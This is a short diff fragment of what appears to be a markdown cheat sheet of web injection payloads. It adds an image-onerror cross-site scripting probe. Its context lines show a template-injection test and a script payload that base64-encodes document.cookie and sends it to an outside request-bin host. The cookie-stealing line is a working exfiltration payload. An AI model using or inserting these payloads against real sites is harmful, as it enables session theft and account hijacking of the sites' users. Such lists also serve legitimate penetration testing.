@@ -343,6 +343,9 @@ ${{1+1}}
 ```html
 <script>fetch('https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie), { method: 'GET',})</script>
 ```
+```html
+<img src=x onerror=alert() />
+```
 
 ### Meta
 ```html
